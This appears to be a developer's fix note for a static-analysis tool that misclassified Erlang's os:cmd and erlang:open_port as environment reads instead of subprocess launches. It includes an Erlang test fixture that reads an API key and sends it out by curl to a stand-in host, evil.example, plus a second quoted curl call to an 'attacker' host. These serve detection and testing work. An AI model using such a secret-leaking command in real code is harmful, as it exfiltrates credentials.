WI-jupaf. erlang.yaml was the only one of the fourteen shipped catalogues with
no `subprocess:` section at all, and `cmd` sat in the os module's env_read AND
env_write lists beside getenv/putenv -- swept along with the rest of the module.
`erlang:open_port/2`, the primitive os:cmd/1 is built on, was catalogued
nowhere.

A FALSE CONFIRM, NOT A RECALL MISS, and that distinction is the point. The call
was never invisible; it was CLASSIFIED, as env_read, and since INV-buzab a
classified call is what `examined` means. So the exfiltration counted as an
EXAMINED NEGATIVE for the boundary that was actually true, with
high_risk: false. Measured on the shipped CLI:

    -module(leak).
    handler() ->
        Secret = os:getenv("API_KEY"),
        os:cmd("curl -d " ++ Secret ++ " https://evil.example/p").

    claim {boundary: subprocess, must_not_exist: true}
      BEFORE  confirmed rc 0   "No subprocess chains found."
      AFTER   violated  rc 1   1 subprocess chain

    same fixture also calling erlang:open_port
      BEFORE  inconclusive rc 2      AFTER  violated rc 1  (2 chains)

    NON-DESTRUCTION, {boundary: env_read, must_not_exist: true}
      BEFORE  violated rc 1          AFTER  violated rc 1

The boundary map splits cleanly and loses nothing:
env_read {os.getenv: 1} / subprocess {os.cmd: 1} high_risk=true /
total_io_edges unchanged at 2.

A CONFOUND ATE THE FIRST MEASUREMENT AND IT FLATTERED THE TOOL, so it is
recorded: the first fixture ALSO called erlang:open_port and returned
`inconclusive` rc 2 -- not because the launch was detected, but because
`erlang` is itself an uncatalogued module and tripped the coverage gate.
Removing open_port isolates os:cmd and the verdict is a clean false confirm.

EMISSION SHAPE MEASURED FIRST, as the item demanded, because rows the analyzer
can never match are a ceiling rather than a payoff -- INV-linub's L2-only fix
measured as a win at the analyzer and produced zero new findings. The Erlang
analyzer emits `erlang:os:0-0:cmd:external_symbol` with
call_construct='remote_external', and the POSITIVE CONTROL is that the existing
WRONG row already matched it end to end, producing an env_read chain. The key
resolved; only the boundary was wrong.

ONE CATALOGUE, NOT TWO -- correcting this item's own filed contrast. It says
elixir "shares the BEAM and gets it right". True of System.cmd, FALSE of
os.cmd: a census measured elixir resolving os.cmd to env_read identically,
because ELIXIR INHERITS ERLANG (the child-over-parent mechanism scala uses for
java). Elixir's own subprocess: section for System.cmd/Port.open is what made
the family look covered. The fix lands once here, and a parity test asserts the
INHERITED answer so a future edit that fixes only the child leaves the parent's
defect visible.

RE-KEYED, NOT SUPPLEMENTED. `cmd` is REMOVED from the env lists rather than
also declared under subprocess, because INV-zumin measured what a
multi-boundary primitive does: lookup_with_module returns one row decided by
YAML ROW ORDER, so the correct declaration would have been live or inert
depending on where it was pasted. A test pins that os.cmd resolves to
{subprocess} alone.

os.cmd and erlang.open_port also join HIGH_RISK_PRIMITIVES. The existing
subprocess drift guard (TestHighRiskPrimitivesDriftGuard) fires otherwise --
it caught this in the red-to-green cycle -- and losing the boundary had lost
the *** HIGH RISK *** marking too, so re-keying alone would have fixed the
chain and left the warning missing.

TAINT-ARM DIRECTION, MEASURED NOT ASSUMED. io_primitives auto-derives taint
entries by boundary (WI-lokuv), so the re-key changes the primitive's ROLE:
env_read derives a SOURCE, subprocess derives a SINK. Verified on the merged
catalogue for both languages -- os.cmd is now a sink in zone `subprocess`
(a command going OUT) where it was a source labelled host_secret (data coming
IN), which is exactly the mis-modelling the item named.

AND THE HALF THAT REMOVAL LEAVES OPEN, filed rather than left to be
discovered (WI-rinal): the source is now ABSENT, and the output of a launched
program is genuinely untrusted input. `Data = os:cmd("curl https://attacker")`
returns attacker-controlled bytes that nothing labels. The OLD source was still
wrong -- env_read maps to host_secret, so the tool was minting a "secret" from
the stdout of `os:cmd("ls")` -- so this is a recall gap the change CREATES, not
a regression it causes, and it generalises past the BEAM to every subprocess
primitive that returns the child's output.

Ref: WI-jupaf, WI-rinal (filed), INV-zumin (row-order hazard avoided).
